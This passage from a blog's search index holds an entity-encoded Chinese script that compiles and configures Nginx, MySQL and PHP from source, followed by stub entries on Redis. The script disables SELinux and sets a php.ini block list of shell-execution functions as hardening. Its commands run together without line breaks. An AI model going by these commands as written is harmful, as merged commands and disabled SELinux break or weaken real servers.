openssl-devel#&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x6267;&#x884C;Nginx&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x8D26;&#x6237;useradd nginx -s /sbin/nologin#&#x5B89;&#x88C5;nginx&#x6E90;&#x7801;&#x5305;cd /usr/local/srctar xzvf nginx-1.6.0.tar.gzcd nginx-1.6.0./configure --user=nginx --group=nginx --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_sub_module --with-http_ssl_module --with-pcremake &amp;&amp; make install#&#x8BBE;&#x7F6E;selinuxsetenforce 0#&#x914D;&#x7F6E;&#x9632;&#x706B;&#x5899;/sbin/iptables -I INPUT -p tcp --dport 80 -j ACCEPTiptables-save &gt; /etc/sysconfig/iptables #&#x9A8C;&#x8BC1;nginx&#x662F;&#x5426;&#x914D;&#x7F6E;&#x6709;&#x8BEF;/usr/local/nginx/sbin/nginx -t#&#x542F;&#x52A8;nginx/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf#&#x67E5;&#x770B;nginx&#x8FDB;&#x7A0B;ps -ef|grep nginx#&#x90E8;&#x7F72;MySQL#&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;mysql&#x7684;&#x7528;&#x6237;useradd mysql -s /sbin/nologin#&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x548C;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x628A;&#x8BE5;&#x76EE;&#x5F55;&#x7684;&#x6240;&#x6709;&#x8005;&#x548C;&#x6240;&#x5C5E;&#x7EC4;&#x8EAB;&#x4EFD;&#x4FEE;&#x6539;&#x4E3A;mysql&#x3002;mkdir -p /usr/local/mysql/varchown -Rf mysql:mysql /usr/local/mysql#&#x89E3;&#x538B;&#x3001;&#x7F16;&#x8BD1;&#x3001;&#x5B89;&#x88C5;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x3002;&#x5728;&#x7F16;&#x8BD1;&#x6570;&#x636E;&#x5E93;&#x65F6;&#x4F7F;&#x7528;&#x7684;&#x662F;cmake&#x547D;&#x4EE4;&#xFF0C;&#x5176;&#x4E2D;&#xFF0C;-DCMAKE_INSTALL_PREFIX&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;-DMYSQL_DATADIR&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;-DSYSCONFDIR&#x5219;&#x662F;&#x5B9A;&#x4E49;MySQL&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x3002;cd /usr/local/srctar xzvf mysql-5.6.19.tar.gzcd mysql-5.6.19cmake . -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DMYSQL_DATADIR=/usr/local/mysql/var -DSYSCONFDIR=/etcmake &amp;&amp; make install#&#x4E3A;&#x4E86;&#x8BA9;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x6B63;&#x5E38;&#x8FD0;&#x8F6C;&#x8D77;&#x6765;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5220;&#x9664;/etc&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5728;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;scripts&#x5185;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;mysql_install_db&#x7684;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#xFF0C;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x5E76;&#x4F7F;&#x7528;--user&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x670D;&#x52A1;&#x7684;&#x5BF9;&#x5E94;&#x8D26;&#x53F7;&#x540D;&#x79F0;&#xFF08;&#x5728;&#x524D;&#x9762;&#x6B65;&#x9AA4;&#x5DF2;&#x7ECF;&#x521B;&#x5EFA;&#xFF09;&#xFF0C;&#x4F7F;&#x7528;--basedir&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x4F7F;&#x7528;--datadir&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x8FD9;&#x6837;&#x5373;&#x53EF;&#x751F;&#x6210;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x4F1A;&#x751F;&#x6210;&#x51FA;&#x65B0;&#x7684;MySQL&#x670D;&#x52A1;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;rm -rf /etc/my.cnfcd /usr/local/mysql./scripts/mysql_install_db --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/var#&#x628A;&#x7CFB;&#x7EDF;&#x65B0;&#x751F;&#x6210;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x94FE;&#x63A5;&#x5230;/etc&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x7A0B;&#x5E8F;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x5F00;&#x673A;&#x7A0B;&#x5E8F;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;/etc/rc.d/init.d&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x4EE5;&#x4FBF;&#x901A;&#x8FC7;service&#x547D;&#x4EE4;&#x6765;&#x7BA1;&#x7406;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#xFF0C;&#x628A;&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x4FEE;&#x6539;&#x6210;755&#x4EE5;&#x4FBF;&#x4E8E;&#x8BA9;&#x7528;&#x6237;&#x6709;&#x6267;&#x884C;&#x8BE5;&#x811A;&#x672C;&#x7684;&#x6743;&#x9650;&#x3002;ln -s my.cnf /etc/my.cnf cp ./support-files/mysql.server /etc/rc.d/init.d/mysqldchmod 755 /etc/rc.d/init.d/mysqld#&#x7F16;&#x8F91;&#x521A;&#x521A;&#x590D;&#x5236;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x7B2C;46&#x3001;47&#x884C;&#x7684;basedir&#x4E0E;datadir&#x53C2;&#x6570;&#x5206;&#x522B;&#x4FEE;&#x6539;&#x4E3A;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x548C;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x3002;sed -i &apos;46d&apos; /etc/rc.d/init.d/mysqld &amp;&amp; sed -i &apos;45 abasedir=/usr/local/mysql&apos; /etc/rc.d/init.d/mysqld sed -i &apos;47d&apos; /etc/rc.d/init.d/mysqld &amp;&amp; sed -i &apos;46 adatadir=/usr/local/mysql/var&apos; /etc/rc.d/init.d/mysqld#&#x542F;&#x52A8;MySQL,&#x628A;mysqld&#x52A0;&#x5165;&#x5F00;&#x673A;&#x542F;&#x52A8;&#x9879;&#x4E2D;&#x3002;service mysqld startchkconfig mysqld on#&#x8BBE;&#x7F6E;PATH&#x53D8;&#x91CF;sed -i &apos;74d&apos; /etc/profile &amp;&amp; sed -i &apos;73 aexport PATH=$PATH:/usr/local/mysql/bin&apos; /etc/profilesource /etc/profile#&#x521B;&#x5EFA;MySQL&#x9ED8;&#x8BA4;&#x7684;&#x6570;&#x636E;&#x6587;&#x6863;&#x5B58;&#x50A8;&#x76EE;&#x5F55;mkdir /var/lib/mysql#&#x94FE;&#x63A5;&#x6587;&#x4EF6;ln -s /usr/local/mysql/lib/mysql /usr/lib/mysqlln -s /tmp/mysql.sock /var/lib/mysql/mysql.sockln -s /usr/local/mysql/include/mysql /usr/include/mysql#&#x90E8;&#x7F72;PHP#&#x5B89;&#x88C5;&#x76F8;&#x5173;&#x6E90;&#x7801;&#x5305;cd /usr/local/srctar zxvf yasm-1.2.0.tar.gzcd yasm-1.2.0./configuremake &amp;&amp; make installcd /usr/local/srctar zxvf libmcrypt-2.5.8.tar.gzcd libmcrypt-2.5.8./configuremake &amp;&amp; make installcd /usr/local/srctar xjvf libvpx-v1.3.0.tar.bz2cd libvpx-v1.3.0./configure --prefix=/usr/local/libvpx --enable-shared --enable-vp9make &amp;&amp; make installcd /usr/local/srctar zxvf tiff-4.0.3.tar.gzcd tiff-4.0.3./configure --prefix=/usr/local/tiff --enable-sharedmake &amp;&amp; make installcd /usr/local/srctar zxvf libpng-1.6.12.tar.gzcd libpng-1.6.12./configure --prefix=/usr/local/libpng --enable-sharedmake &amp;&amp; make installcd /usr/local/srctar zxvf freetype-2.5.3.tar.gzcd freetype-2.5.3./configure --prefix=/usr/local/freetype --enable-sharedmake &amp;&amp; make installcd /usr/local/srctar zxvf jpegsrc.v9a.tar.gzcd jpeg-9a./configure --prefix=/usr/local/jpeg --enable-sharedmake &amp;&amp; make installcd /usr/local/srctar zxvf libgd-2.1.0.tar.gzcd libgd-2.1.0./configure --prefix=/usr/local/libgd --enable-shared --with-jpeg=/usr/local/jpeg --with-png=/usr/local/libpng --with-freetype=/usr/local/freetype --with-fontconfig=/usr/local/freetype --with-xpm=/usr/ --with-tiff=/usr/local/tiff --with-vpx=/usr/local/libvpxmake &amp;&amp; make installcd /usr/local/srctar zxvf t1lib-5.1.2.tar.gzcd t1lib-5.1.2./configure --prefix=/usr/local/t1lib --enable-sharedmake without_doc &amp;&amp; make installln -s /usr/lib64/libltdl.so /usr/lib/libltdl.socp -frp /usr/lib64/libXpm.so* /usr/lib/#&#x6B64;&#x65F6;&#x7EC8;&#x4E8E;&#x628A;&#x7F16;&#x8BD1;php&#x670D;&#x52A1;&#x6E90;&#x7801;&#x5305;&#x7684;&#x76F8;&#x5173;&#x8F6F;&#x4EF6;&#x5305;&#x90FD;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;&#x90E8;&#x7F72;&#x59A5;&#x5F53;&#x4E86;&#x3002;&#x5728;&#x5F00;&#x59CB;&#x7F16;&#x8BD1;php&#x6E90;&#x7801;&#x5305;&#x4E4B;&#x524D;&#xFF0C;&#x5148;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;LD_LIBRARY_PATH&#x7684;&#x5168;&#x5C40;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#xFF0C;&#x8BE5;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x5E2E;&#x52A9;&#x7CFB;&#x7EDF;&#x627E;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x52A8;&#x6001;&#x94FE;&#x63A5;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x662F;&#x7F16;&#x8BD1;php&#x670D;&#x52A1;&#x6E90;&#x7801;&#x5305;&#x7684;&#x5FC5;&#x987B;&#x5143;&#x7D20;&#x4E4B;&#x4E00;&#x3002;&#x7F16;&#x8BD1;php&#x670D;&#x52A1;&#x6E90;&#x7801;&#x5305;&#x65F6;&#xFF0C;&#x9664;&#x4E86;&#x5B9A;&#x4E49;&#x8981;&#x5B89;&#x88C5;&#x5230;&#x7684;&#x76EE;&#x5F55;&#x4EE5;&#x5916;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x4F9D;&#x6B21;&#x5B9A;&#x4E49;&#x914D;&#x7F6E;php&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x3001;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x6240;&#x5728;&#x76EE;&#x5F55;&#x3001;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x76EE;&#x5F55;&#xFF0C;&#x4EE5;&#x53CA;libpng&#x3001;jpeg&#x3001;freetype&#x3001;libvpx&#x3001;zlib&#x3001;t1lib&#x7B49;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x5B89;&#x88C5;&#x76EE;&#x5F55;&#x8DEF;&#x5F84;&#xFF0C;&#x5E76;&#x901A;&#x8FC7;&#x53C2;&#x6570;&#x542F;&#x52A8;php&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x8BF8;&#x591A;&#x9ED8;&#x8BA4;&#x529F;&#x80FD;&#x3002;cd /usr/local/srctar -zvxf php-5.5.14.tar.gzcd php-5.5.14export LD_LIBRARY_PATH=/usr/local/libgd/lib./configure --prefix=/usr/local/php --with-config-file-path=/usr/local/php/etc --with-mysql=/usr/local/mysql --with-mysqli=/usr/local/mysql/bin/mysql_config --with-mysql-sock=/tmp/mysql.sock --with-pdo-mysql=/usr/local/mysql --with-gd --with-png-dir=/usr/local/libpng --with-jpeg-dir=/usr/local/jpeg --with-freetype-dir=/usr/local/freetype --with-xpm-dir=/usr/ --with-vpx-dir=/usr/local/libvpx/ --with-zlib-dir=/usr/local/zlib --with-t1lib=/usr/local/t1lib --with-iconv --enable-libxml --enable-xml --enable-bcmath --enable-shmop --enable-sysvsem --enable-inline-optimization --enable-opcache --enable-mbregex --enable-fpm --enable-mbstring --enable-ftp --enable-gd-native-ttf --with-openssl --enable-pcntl --enable-sockets --with-xmlrpc --enable-zip --enable-soap --without-pear --with-gettext --enable-session --with-mcrypt --with-curl --enable-ctypemake &amp;&amp; make install#&#x5728;php&#x6E90;&#x7801;&#x5305;&#x7A0B;&#x5E8F;&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x5220;&#x9664;&#x5F53;&#x524D;&#x9ED8;&#x8BA4;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5C06;php&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x76EE;&#x5F55;&#x4E2D;&#x76F8;&#x5E94;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x8FC7;&#x6765;&#x3002;rm -rf /etc/php.iniln -s /usr/local/php/etc/php.ini /etc/php.inicp php.ini-production /usr/local/php/etc/php.inicp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.confln -s /usr/local/php/etc/php-fpm.conf /etc/php-fpm.conf#php-fpm.conf&#x662F;php&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x91CD;&#x8981;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E4B;&#x4E00;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x542F;&#x7528;&#x8BE5;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x7B2C;25&#x884C;&#x7684;pid&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x7136;&#x540E;&#x5206;&#x522B;&#x5C06;&#x7B2C;148&#x548C;149&#x884C;&#x7684;user&#x4E0E;group&#x53C2;&#x6570;&#x5206;&#x522B;&#x4FEE;&#x6539;&#x4E3A;nginx&#x8D26;&#x6237;&#x548C;&#x7528;&#x6237;&#x7EC4;&#x540D;&#x79F0;&#x3002;sed -i &apos;25d&apos; /usr/local/php/etc/php-fpm.conf &amp;&amp; sed -i &apos;24 apid = run/php-fpm.pid&apos; /usr/local/php/etc/php-fpm.conf sed -i &apos;148d&apos; /usr/local/php/etc/php-fpm.conf &amp;&amp; sed -i &apos;147 auser = nginx&apos; /usr/local/php/etc/php-fpm.confsed -i &apos;149d&apos; /usr/local/php/etc/php-fpm.conf &amp;&amp; sed -i &apos;148 agroup = nginx&apos; /usr/local/php/etc/php-fpm.conf#&#x914D;&#x7F6E;&#x59A5;&#x5F53;&#x540E;&#x4FBF;&#x53EF;&#x628A;&#x7528;&#x4E8E;&#x7BA1;&#x7406;php&#x670D;&#x52A1;&#x7684;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;/etc/rc.d/init.d&#x4E2D;&#x4E86;&#x3002;&#x4E3A;&#x4E86;&#x80FD;&#x591F;&#x6267;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x8BF7;&#x8BB0;&#x5F97;&#x4E3A;&#x811A;&#x672C;&#x8D4B;&#x4E88;755&#x6743;&#x9650;&#xFF0C;&#x6700;&#x540E;&#x628A;php-fpm&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x52A0;&#x5165;&#x5230;&#x5F00;&#x673A;&#x542F;&#x52A8;&#x9879;&#x4E2D;&#x3002;cp /usr/local/src/php-5.5.14/sapi/fpm/init.d.php-fpm /etc/rc.d/init.d/php-fpmchmod 755 /etc/rc.d/init.d/php-fpmchkconfig php-fpm on#&#x7981;&#x7528;&#x9AD8;&#x5371;&#x529F;&#x80FD;sed -i &apos;305d&apos; /usr/local/php/etc/php.ini &amp;&amp; sed -i &apos;304 adisable_functions = passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restor e,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,escapeshellcmd,dll,popen,disk_free_space,checkdnsrr,checkdnsrr,g etservbyname,getservbyport,disk_total_space,posix_ctermid,posix_get_last_error,posix_getcwd,posix_getegid,posix_geteuid,posix_getgid,po six_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,posix_getppid,posix_getpwnam,posix_ getpwuid,posix_getrlimit,posix_getsid,posix_getuid,posix_isatty,posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,posix_ setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname&apos; /usr/local/php/etc/php.ini#&#x8FD9;&#x6837;&#x5C31;&#x628A;php&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x914D;&#x7F6E;&#x59A5;&#x5F53;&#x4E86;&#x3002;&#x6700;&#x540E;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x7F16;&#x8F91;Nginx&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4E3B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x7B2C;2&#x884C;&#x7684;&#x4E95;&#x53F7;&#xFF08;#&#xFF09;&#x5220;&#x9664;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x540E;&#x9762;&#x5199;&#x4E0A;&#x8D1F;&#x8D23;&#x8FD0;&#x884C;Nginx&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x8D26;&#x6237;&#x540D;&#x79F0;&#x548C;&#x7528;&#x6237;&#x7EC4;&#x540D;&#x79F0;&#xFF1B;&#x5728;&#x7B2C;45&#x884C;&#x7684;index&#x53C2;&#x6570;&#x540E;&#x9762;&#x5199;&#x4E0A;&#x7F51;&#x7AD9;&#x7684;&#x9996;&#x9875;&#x540D;&#x79F0;&#x3002;&#x6700;&#x540E;&#x662F;&#x5C06;&#x7B2C;65&#xFF5E;71&#x884C;&#x53C2;&#x6570;&#x524D;&#x7684;&#x4E95;&#x53F7;&#xFF08;#&#xFF09;&#x5220;&#x9664;&#x6765;&#x542F;&#x7528;&#x53C2;&#x6570;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x4FEE;&#x6539;&#x7B2C;69&#x884C;&#x7684;&#x811A;&#x672C;&#x540D;&#x79F0;&#x8DEF;&#x5F84;&#x53C2;&#x6570;&#xFF0C;&#x5176;&#x4E2D;$document_root&#x53D8;&#x91CF;&#x5373;&#x4E3A;&#x7F51;&#x7AD9;&#x4FE1;&#x606F;&#x5B58;&#x50A8;&#x7684;&#x6839;&#x76EE;&#x5F55;&#x8DEF;&#x5F84;&#xFF0C;&#x82E5;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;&#x8BE5;&#x53D8;&#x91CF;&#xFF0C;&#x5219;Nginx&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x65E0;&#x6CD5;&#x627E;&#x5230;&#x7F51;&#x7AD9;&#x4FE1;&#x606F;&#xFF0C;&#x56E0;&#x6B64;&#x4F1A;&#x63D0;&#x793A;&#x201C;404&#x9875;&#x9762;&#x672A;&#x627E;&#x5230;&#x201D;&#x7684;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#x3002;&#x5728;&#x786E;&#x8BA4;&#x53C2;&#x6570;&#x4FE1;&#x606F;&#x586B;&#x5199;&#x6B63;&#x786E;&#x540E;&#x4FBF;&#x53EF;&#x91CD;&#x542F;Nginx&#x670D;&#x52A1;&#x4E0E;php-fpm&#x670D;&#x52A1;&#x3002;sed -i &apos;2d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;1 auser nginx nginx;&apos; /usr/local/nginx/conf/nginx.conf sed -i &apos;45d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;44 aindex index.html index.htm index.php;&apos; /usr/local/nginx/conf/nginx.conf sed -i &apos;65d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;64 alocation ~ \\.php$ {&apos; /usr/local/nginx/conf/nginx.conf sed -i &apos;66d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;65 aroot html;&apos; /usr/local/nginx/conf/nginx.conf sed -i &apos;67d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;66 afastcgi_pass 127.0.0.1:9000;&apos; /usr/local/nginx/conf/nginx.conf sed -i &apos;68d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;67 afastcgi_index index.php;&apos; /usr/local/nginx/conf/nginx.conf sed -i &apos;69d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;68 afastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;&apos; /usr/local/nginx/conf/nginx.confsed -i &apos;70d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;69 ainclude fastcgi_params;&apos; /usr/local/nginx/conf/nginx.conf sed -i &apos;71d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;70 a}&apos; /usr/local/nginx/conf/nginx.conf#&#x91CD;&#x65B0;&#x52A0;&#x8F7D;nginx&#xFF0C;&#x91CD;&#x542F;php-fpm/usr/local/nginx/sbin/nginx -s reloadsystemctl restart php-fpmecho &quot;&#x606D;&#x559C;&#xFF01;LNMP&#x52A8;&#x6001;&#x7F51;&#x7AD9;&#x73AF;&#x5883;&#x67B6;&#x6784;&#x7684;&#x914D;&#x7F6E;&#x5DF2;&#x5B8C;&#x6210;&#xFF01;&quot;echo &quot;MySQL&#x5DF2;&#x5B89;&#x88C5;&#x6210;&#x529F;&#xFF0C;&#x8BF7;&#x6267;&#x884C; source /etc/profile &#x540E;&#xFF0C;&#x518D;&#x6267;&#x884C; mysql_secure_installation &#x6765;&#x5B8C;&#x6210;MySQL&#x6570;&#x636E;&#x5E93;&#x7684;&#x521D;&#x59CB;&#x5316;&#xFF01;&quot; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Shell编程","date":"2022-06-07T04:50:59.000Z","path":"/posts/6309c3f8/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Redis与其他应用的集成","date":"2022-06-07T04:50:43.000Z","path":"/posts/5188e636/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Redis配合MySQL使用","date":"2022-06-07T04:50:32.000Z","path":"/posts/3e3d973e/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Redis安装部署——Cluster集群","date":"2022-06-07T04:50:08.000Z","path":"/posts/e8376589/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Redis安装部署——Sentinel模式","date":"2022-06-07T04:49:59.000Z","path":"/posts/e78aaf59/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Redis安装部署——主从复制","date":"2022-06-07T04:49:49.000Z","path":"/posts/2acd829b/","text":"Redis&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#xFF08;&#x5B9E;&#x73B0;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#xFF09;Redis&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8FC7;&#x7A0B;&#x4E3B;&#x5E93;&#x4F1A;&#x57FA;&#x4E8E;pingcheck&#x65B9;&#x5F0F;&#x68C0;&#x67E5;&#x4ECE;&#x5E93;&#x662F;&#x5426;&#x5728;&#x7EBF;&#xFF0C;&#x5982;&#x679C;&#x5728;&#x7EBF;&#x5219;&#x76F4;&#x63A5;&#x540C;&#x6B65;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x81F3;&#x4ECE;&#x670D;&#x52A1;&#x7AEF;&#xFF0C;&#x4ECE;&#x670D;&#x52A1;&#x7AEF;&#x4E5F;&#x53EF;&#x4EE5;&#x4E3B;&#x52A8;&#x53D1;&#x9001;&#x540C;&#x6B65;&#x8BF7;&#x6C42;&#x5230;&#x4E3B;&#x670D;&#x52A1;&#x5355;&#xFF0C;&#x4E3B;&#x5E93;&#x5982;&#x679C;&#x662F;&#x542F;&#x52A8;&#x4E86;&#x6301;&#x4E45;&#x5316;&#x529F;&#x80FD;&#x65F6;&#xFF0C;&#x4F1A;&#x4E0D;&#x65AD;&#x7684;&#x540C;&#x6B65;&#x6570;&#x636E;&#x5230;&#x78C1;&#x76D8;&#x4E0A;&#xFF0C;&#x4E3B;&#x5E93;&#x4E00;&#x65E6;&#x6536;&#x5230;&#x4ECE;&#x5E93;&#x7684;&#x540C;&#x6B65;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x4E3B;&#x5E93;&#x4F1A;&#x5C06;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x505A;&#x5FEB;&#x7167;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x540C;&#x6B65;&#x7ED9;&#x4ECE;&#x5E93;&#xFF0C;&#x4ECE;&#x5E93;&#x5F97;&#x5230;&#x4EE5;&#x540E;&#x662F;&#x4FDD;&#x5B58;&#x5728;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x4E2D;&#x